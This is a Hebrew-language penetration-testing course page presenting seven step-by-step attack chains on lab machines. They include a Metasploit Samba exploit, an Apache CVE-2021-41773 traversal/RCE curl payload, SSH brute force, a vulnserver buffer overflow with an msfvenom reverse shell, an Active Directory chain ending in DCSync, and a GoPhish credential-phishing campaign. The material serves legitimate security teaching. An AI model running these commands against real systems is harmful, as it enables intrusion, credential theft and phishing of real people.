<div dir="rtl">

# 🌍 דוגמאות מהעולם האמיתי (Real-World Worked Examples)

> שרשראות תקיפה מלאות, צעד-אחר-צעד, כפי שהן קורות בבדיקת חדירות אמיתית. כל דוגמה מדגימה את המתודולוגיה מקצה לקצה על מכונת תרגול **חוקית**. שחזר אותן במעבדה שלך.
>
> ⚠️ כל הדוגמאות בוצעו על מכונות תרגול ייעודיות (VulnHub / TryHackMe). לעולם לא על מערכת אמיתית ללא רשות.

---

## דוגמה 1 — Kioptrix Level 1 (Linux, קל)

**התרחיש:** קיבלת IP יחיד במעבדה. המטרה: root.

### שלב 1 — Recon / גילוי
```bash
nmap -sn 192.168.56.0/24          # מציאת המכונה החיה
# → 192.168.56.101
```

### שלב 2 — Enumeration
```bash
nmap -sC -sV -p- -oN kioptrix.txt 192.168.56.101
```
פלט מפתח:
```text
22/tcp  open  ssh      OpenSSH 2.9p2
80/tcp  open  http     Apache 1.3.20 (mod_ssl/2.8.4 OpenSSL/0.9.6b)
139/tcp open  netbios  Samba
443/tcp open  ssl/http Apache/1.3.20
```
מנייה עמוקה יותר:
```bash
enum4linux -a 192.168.56.101      # → Samba 2.2.1a
nikto -h http://192.168.56.101    # → mod_ssl פגיע
```

### שלב 3 — חקר חולשות
```bash
searchsploit Samba 2.2            # → trans2open (CVE-2003-0201)
searchsploit mod_ssl 2.8          # → OpenFuck (CVE-2002-0082)
```
**שני וקטורים אפשריים.** נבחר ב-Samba (יציב ב-Metasploit).

### שלב 4 — ניצול
```bash
msfconsole
use exploit/linux/samba/trans2open
set RHOSTS 192.168.56.101
set LHOST 192.168.56.10           # Kali שלך
set PAYLOAD linux/x86/shell_reverse_tcp
exploit
```

### שלב 5 — הוכחה
```bash
whoami        # root
id            # uid=0(root)
cat /etc/shadow    # פרס — כל ה-Hashes
```

**לקח:** גרסאות ישנות (Apache 1.3.20, Samba 2.2.1a) → חולשות מוכרות → root. **המנייה הובילה ישירות לניצול.**

---

## דוגמה 2 — ניצול Web: Apache Path Traversal (CVE-2021-41773)

**התרחיש:** שרת web מריץ Apache 2.4.49 — גרסה עם חולשת Path Traversal מפורסמת.

### מנייה
```bash
nmap -sV -p 80 10.10.10.50        # → Apache/2.4.49
whatweb http://10.10.10.50
```

### חקר וניצול
חולשת **CVE-2021-41773** מאפשרת קריאת קבצים מחוץ ל-root של השרת:
```bash
# קריאת /etc/passwd דרך Path Traversal:
curl 'http://10.10.10.50/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'
```
אם `mod_cgi` מאופשר — אפשר להסלים ל-RCE (Remote Code Execution):
```bash
curl 'http://10.10.10.50/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' \
  --data 'echo Content-Type: text/plain; echo; id'
# → uid=1(daemon) — הרצת פקודות!
```

**לקח:** זיהוי **גרסה מדויקת** (2.4.49) הוא ההבדל בין "יש שרת web" ל-"יש לי RCE". תמיד `-sV`.

---

## דוגמה 3 — Brute Force ל-SSH (הקדמה למודול 8)

**התרחיש:** פורט 22 פתוח, אין Exploit לגרסה, אך יש שם משתמש שנחשף במנייה.

### מנייה
```bash
nmap -sV -p 22 10.10.10.60        # OpenSSH — אין Exploit ישיר
# במנייה קודמת מצאנו שם משתמש: "admin"
```

### תקיפת סיסמה
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.60
# → [22][ssh] host: 10.10.10.60  login: admin  password: password123
```

### גישה
```bash
ssh admin@10.10.10.60             # התחברות עם הפרטים שנמצאו
whoami
```

**לקח:** לא כל גישה מגיעה מ-Exploit. **סיסמה חלשה** היא לעיתים הדרך הקלה ביותר. (מודול 8 — Password Attacks.)

---

## דוגמה 4 — שרשרת אמיתית: Recon פסיבי → גישה ראשונית

**התרחיש:** בדיקת חדירות חיצונית (External) על ארגון. אין נקודת התחלה מלבד הדומיין.

### 1. OSINT פסיבי (מודול 5)
```bash
sublist3r -d company.com          # → dev.company.com נמצא
# hunter.io → תבנית מייל: {first}.{last}@company.com
# HaveIBeenPwned → מייל של עובד הופיע בדלף
```

### 2. גישה אקטיבית
```bash
nmap -sC -sV dev.company.com      # סביבת פיתוח חשופה, פורט 8080 פתוח
```
פאנל התחברות ב-`dev.company.com:8080`. עם פרטי הגישה שדלפו (מ-HIBP) — כניסה מצליחה (Credential Reuse).

**לקח:** **דלף מידע + סביבת פיתוח חשופה** = גישה ראשונית ללא ניצול טכני כלל. הגורם האנושי והתצורה החלשה הם לרוב הווקטור.

---

## דוגמה 5 — Buffer Overflow מלא על vulnserver (מודול 10)

**התרחיש:** שירות TCP פגיע (`vulnserver`) על פורט 9999. המטרה: Shell דרך גלישת חוצץ.

### שלב 1 — Fuzzing (מציאת טווח הקריסה)
```python
# סקריפט ששולח כמות גדלה של A עד קריסה
buf = "A" * 100
while True:
    s.send(("TRUN /.:/" + buf).encode()); buf += "A"*100
# → קרס סביב 2000 בתים
```

### שלב 2 — מציאת ה-Offset
```bash
msf-pattern_create -l 3000        # דפוס ייחודי → שולחים, קוראים EIP
msf-pattern_offset -l 3000 -q 386F4337
# → Exact match at offset 2003
```

### שלב 3 — אימות שליטה ב-EIP
```python
buffer = b"A"*2003 + b"B"*4        # EIP צריך להראות 42424242 ✅
```

### שלב 4 — Bad Characters ו-JMP ESP
```text
!mona bytearray -b "\x00"          # השוואה → רק \x00 רע
!mona find -s "\xff\xe4" -m essfunc.dll   # → 625011AF
```

### שלב 5 — Shellcode → Shell
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<kali> LPORT=4444 \
  EXITFUNC=thread -b "\x00" -f python -v shellcode
```
```python
buffer = b"A"*2003 + b"\xaf\x11\x50\x62" + b"\x90"*16 + shellcode
```
```bash
nc -lvnp 4444   # מריצים את ה-exploit → C:\> whoami
```

**לקח:** BOF הוא **תהליך קבוע בן 7 שלבים**. הדיוק ב-Offset, ב-Bad Chars וב-Little-Endian הוא ההבדל בין כישלון להצלחה.

---

## דוגמה 6 — Active Directory: מ-Zero ל-Domain Admin (מודולים 8, 11, 13)

**התרחיש:** בדיקה פנימית, חוברת ל-LAN **ללא אישורים**. המטרה: Domain Admin.

### שלב 1 — LLMNR Poisoning (גישה ראשונית ללא אישורים)
```bash
sudo responder -I eth0 -dwv       # לוכד NTLMv2 hash של משתמש
hashcat -m 5600 hash.txt rockyou.txt
# → j.smith : Summer2021
```

### שלב 2 — Enumeration עם אישורים
```bash
crackmapexec smb <dc-ip> -u j.smith -p 'Summer2021' --users
bloodhound-python -u j.smith -p 'Summer2021' -d corp.local -ns <dc-ip> -c All
```

### שלב 3 — Kerberoasting (הרחבת הרשאות)
```bash
GetUserSPNs.py corp.local/j.smith:'Summer2021' -dc-ip <dc-ip> -request
hashcat -m 13100 tgs.txt rockyou.txt
# → svc_sql : Password123!
```

### שלב 4 — BloodHound מראה נתיב + תנועה רוחבית
```text
BloodHound: svc_sql → AdminTo → FILE01 (יושב עליו session של Domain Admin)
```
```bash
secretsdump.py corp.local/svc_sql:'Password123!'@FILE01   # → NTLM של DA
```

### שלב 5 — DCSync → השתלטות
```bash
secretsdump.py corp.local/DAuser@<dc-ip> -hashes :<DA-NTLM>
# lsadump::dcsync → hash של Administrator → Domain Admin 🏆
```

**לקח:** שרשרת AD קלאסית: **LLMNR → Kerberoast → BloodHound → PtH → DCSync**. שים לב שכל שלב מזין את הבא, ושפיצוח סיסמאות (מודול 8) מופיע פעמיים.

---

## דוגמה 7 — פישינג → גישה פנימית (מודולים 15, 12, 13)

**התרחיש:** בדיקה חיצונית בהרשאה. אין נקודת כניסה טכנית — נשתמש בגורם האנושי.

### שלב 1 — OSINT
```bash
theHarvester -d corp.com -b all    # מיילים + מבנה first.last@corp.com
# LinkedIn → 40 עובדים, טכנולוגיה: Office 365
```

### שלב 2 — קמפיין פישינג (GoPhish)
```text
Pretext: "מחלקת IT — מעבר ל-O365 חדש, התחבר לאימות"
Landing Page: שבט של דף התחברות O365
→ נשלח ל-40 עובדים; 6 הזינו סיסמה
```

### שלב 3 — שימוש בגישה
```bash
# אחת הסיסמאות עובדת ב-VPN → דריסת רגל ברשת הפנימית
# משם: Pivoting (מודול 12) → Kerberoasting ו-AD (מודול 13)
```

**לקח:** ~90% מהפריצות מתחילות כך. **MFA** היה חוסם את שלב 3 גם עם סיסמה נכונה — ולכן הוא ההמלצה הקריטית ביותר בדוח (מודול 16).

---

## מה משותף לכל הדוגמאות?

1. **המתודולוגיה זהה** תמיד: Recon → Enumeration → חקר חולשה → ניצול → הוכחה.
2. **מנייה יסודית** (במיוחד `-sV`) היא שקובעת את הצלחת הניצול.
3. **גרסאות ישנות, סיסמאות חלשות, ותצורה שגויה** הם הווקטורים הנפוצים — לא רק Exploits מתוחכמים.
4. **תיעוד** בכל שלב = הבסיס לדוח (מודול 16).

> 📤 בחר דוגמה, שחזר אותה במעבדה, ותעד כל צעד. זה התרגול הכי אפקטיבי.

[⬅️ חזרה למפת הקורס](../README.md) · [בנק שאלות](question-bank.md) · [מבחן מעשי](practical-exam.md)

</div>
